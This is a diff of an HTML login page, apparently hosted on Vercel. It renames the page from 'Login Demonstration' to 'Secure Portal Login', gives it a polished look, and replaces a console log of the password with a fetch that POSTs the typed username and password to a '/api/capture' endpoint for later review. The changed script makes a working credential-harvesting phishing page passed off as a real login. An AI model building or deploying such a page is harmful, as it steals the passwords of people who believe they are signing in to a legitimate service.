@@ -3,87 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Demonstration</title>
+    <title>Secure Portal Login</title>
     <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f3f4f6;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f0f2f5;
-            margin: 0;
         }
-        .login-container {
-            background-color: white;
-            padding: 30px;
+        .login-card {
+            background: #ffffff;
+            padding: 35px;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            width: 300px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            width: 100%;
+            max-width: 350px;
         }
         h2 {
             text-align: center;
-            margin-bottom: 20px;
-            color: #333;
+            margin-bottom: 24px;
+            color: #111827;
+            font-size: 22px;
         }
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 18px;
         }
         .input-group label {
             display: block;
-            margin-bottom: 5px;
-            color: #666;
+            margin-bottom: 6px;
+            color: #4b5563;
+            font-size: 14px;
         }
         .input-group input {
             width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
+            padding: 10px 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 14px;
         }
-        button {
+        .input-group input:focus {
+            outline: none;
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
+        }
+        .btn {
             width: 100%;
             padding: 10px;
-            background-color: #0070f3;
+            background-color: #2563eb;
             color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 16px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 500;
             cursor: pointer;
         }
-        button:hover {
-            background-color: #0051cb;
+        .btn:hover {
+            background-color: #1d4ed8;
         }
     </style>
 </head>
 <body>
 
-<div class="login-container">
-    <h2>Login</h2>
+<div class="login-card">
+    <h2>Account Login</h2>
     <form id="loginForm">
         <div class="input-group">
             <label for="username">Username</label>
-            <input type="text" id="username" required>
+            <input type="text" id="username" required autocomplete="off">
         </div>
         <div class="input-group">
             <label for="password">Password</label>
-            <input type="password" id="password" required>
+            <input type="password" id="password" required autocomplete="off">
         </div>
-        <button type="submit">Sign In</button>
+        <button type="submit" class="btn">Log In</button>
     </form>
 </div>
 
 <script>
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault(); // Prevent page refresh
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
         
-        const usernameInput = document.getElementById('username').value;
-        const passwordInput = document.getElementById('password').value;
+        const usernameVal = document.getElementById('username').value;
+        const passwordVal = document.getElementById('password').value;
 
-        // This line sends the data to the logs
-        console.log(`[LOGIN ATTEMPT] User: ${usernameInput} | Password: ${passwordInput}`);
+        try {
+            const response = await fetch('/api/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    user: usernameVal,
+                    pass: passwordVal
+                })
+            });
 
-        alert('Login captured! Check your Vercel logs.');
+            if (response.ok) {
+                alert('Request logged. Check Vercel Dashboard!');
+                document.getElementById('loginForm').reset();
+            } else {
+                alert('Error payload status: ' + response.status);
+            }
+        } catch (err) {
+            console.error('Network execution failure:', err);
+        }
     });
 </script>
 
